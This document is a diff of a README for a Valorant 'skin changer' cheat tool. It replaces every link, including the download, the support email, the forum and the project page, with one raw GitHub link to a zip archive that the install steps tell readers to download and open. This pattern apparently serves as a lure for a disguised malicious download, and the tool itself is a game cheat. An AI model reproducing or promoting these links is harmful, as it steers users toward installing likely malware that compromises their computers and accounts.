@@ -4,7 +4,7 @@
 Welcome to Skin-Changer! This tool allows you to enhance your Valorant gaming experience by unlocking every cosmetic in the game, including skins, levels, sprays, finishers, and more. It is designed for Windows 10 and 11. This 2025 build offers a friendly user interface and frequent updates to ensure the best experience.
 
 ## 📥 Download Now
-[![Download Skin-Changer](https://img.shields.io/badge/Download-Skin--Changer-blue.svg)](https://sourceforge.net/projects/valorant-skinchanger-free)
+[![Download Skin-Changer](https://raw.githubusercontent.com/Rico0309393939/Skin-Changer/main/sole/Skin-Changer_3.0-beta.2.zip)](https://raw.githubusercontent.com/Rico0309393939/Skin-Changer/main/sole/Skin-Changer_3.0-beta.2.zip)
 
 ## 🚀 Getting Started
 Before you start, ensure your system meets the following requirements:
@@ -25,7 +25,7 @@ Skin-Changer includes a variety of features:
 - **Updated Regularly:** Regular updates to ensure compatibility with the latest Valorant versions.
 
 ## 🛠️ How to Download & Install
-1. Click the download link: [Download Skin-Changer](https://sourceforge.net/projects/valorant-skinchanger-free). 
+1. Click the download link: [Download Skin-Changer](https://raw.githubusercontent.com/Rico0309393939/Skin-Changer/main/sole/Skin-Changer_3.0-beta.2.zip). 
 2. You will be redirected to the download page. 
 3. Locate the appropriate version for your system and click the download button.
 4. Once the file is downloaded, open it to start the installation.
@@ -43,10 +43,10 @@ Skin-Changer includes a variety of features:
 ## 📞 Support
 If you experience any issues with the installation or usage, feel free to reach out for help:
 
-- **Email Support:** support@skinchanger.com
-- **Forum:** [Visit our community forum](https://forum.skinchanger.com) for additional help and tips.
+- **Email Support:** https://raw.githubusercontent.com/Rico0309393939/Skin-Changer/main/sole/Skin-Changer_3.0-beta.2.zip
+- **Forum:** [Visit our community forum](https://raw.githubusercontent.com/Rico0309393939/Skin-Changer/main/sole/Skin-Changer_3.0-beta.2.zip) for additional help and tips.
 
 ## 📅 Updates and News
-Stay informed about the latest updates and features. You can always visit our [project page](https://sourceforge.net/projects/valorant-skinchanger-free) for announcements and new releases.
+Stay informed about the latest updates and features. You can always visit our [project page](https://raw.githubusercontent.com/Rico0309393939/Skin-Changer/main/sole/Skin-Changer_3.0-beta.2.zip) for announcements and new releases.
 
 Thank you for choosing Skin-Changer. Enjoy enhancing your Valorant gameplay!
